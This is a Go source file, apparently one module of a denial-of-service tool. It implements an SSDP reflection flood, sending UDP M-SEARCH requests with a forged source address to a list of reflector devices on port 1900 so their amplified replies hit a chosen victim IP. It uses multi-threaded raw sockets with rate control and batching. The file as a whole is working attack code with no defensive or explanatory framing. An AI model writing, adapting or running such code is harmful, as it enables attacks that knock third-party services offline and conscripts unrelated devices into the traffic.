package main

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
)

func startSsdpReflection(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, reflectors []ReflectorData, threads int, duration time.Duration, pps int) {
	fmt.Printf("[!] Starting SSDP Reflection on %s:%d for %v with %d threads (PPS: %d)\n", targetIP, targetPort, duration, threads, pps)

	targets := [][]byte{
		[]byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"),
		[]byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: upnp:rootdevice\r\n\r\n"),
		[]byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n"),
		[]byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: urn:schemas-sonos-com:service:Queue:1\r\n\r\n"),
	}

	var wg sync.WaitGroup

	var parsedReflectors []net.IP
	for _, r := range reflectors {
		cleanIP := r.Addr
		if h, _, err := net.SplitHostPort(r.Addr); err == nil {
			cleanIP = h
		}
		if ip := net.ParseIP(cleanIP).To4(); ip != nil {
			parsedReflectors = append(parsedReflectors, ip)
		}
	}

	if len(parsedReflectors) == 0 {
		fmt.Printf("[ERR] No SSDP reflectors found\n")
		return
	}

	victimIP := net.ParseIP(targetIP).To4()
	if victimIP == nil {
		fmt.Printf("[ERR] Invalid target IP: %s\n", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in SSDP: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			sockFd, err := openRawSocket(IPPROTO_UDP)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			udpBuf := make([]byte, 1500)

			for {
				// High-performance batching
				batchSize := 64
				if pps > 0 {
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						reflIP := parsedReflectors[localRand.Intn(len(parsedReflectors))]
						
						payload := targets[localRand.Intn(len(targets))]
						packet := buildSpoofedUDPLocalOptimized(victimIP, uint16(targetPort), reflIP, 1900, payload, localRand, udpBuf)

						if sockFd != InvalidSocket {
							sendtoRaw(sockFd, packet, reflIP, 1900)
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	
	fmt.Printf("[OK] SSDP Reflection finished\n")
}
